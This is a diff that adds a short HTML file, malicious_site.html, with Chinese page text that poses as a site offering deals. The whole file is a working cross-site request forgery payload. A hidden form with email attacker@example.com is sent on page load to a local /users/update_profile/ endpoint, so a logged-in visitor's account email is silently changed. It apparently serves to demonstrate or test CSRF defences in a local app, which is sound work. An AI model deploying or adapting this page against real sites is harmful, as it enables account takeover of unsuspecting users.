@@ -1,0 +1,23 @@
+<!-- malicious_site.html -->
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>恶意网站</title>
+</head>
+<body>
+    <h1>欢迎访问恶意网站</h1>
+    <p>请查看我们的最新优惠！</p>
+
+    <!-- 隐藏的表单 -->
+    <form id="csrf-form" method="post" action="http://127.0.0.1:8000/users/update_profile/">
+        <input type="hidden" name="email" value="attacker@example.com">
+    </form>
+
+    <script>
+        // 自动提交表单
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
